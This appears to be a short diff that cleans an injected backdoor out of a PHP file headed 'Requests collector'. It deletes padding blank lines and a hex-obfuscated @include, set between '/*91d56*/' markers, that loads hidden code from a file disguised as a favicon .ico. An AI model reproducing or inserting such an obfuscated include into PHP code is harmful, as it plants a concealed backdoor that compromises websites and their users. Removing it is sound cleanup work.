@@ -1,24 +1,4 @@
 <?php
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-/*91d56*/
-
-@include "\x2fho\x6de/\x66er\x6fma\x64el\x2eco\x6d/w\x65b/\x63li\x2ffa\x76ic\x6fn_\x646a\x617a\x2eic\x6f";
-
-/*91d56*/
 /**
  * Requests collector.
  *
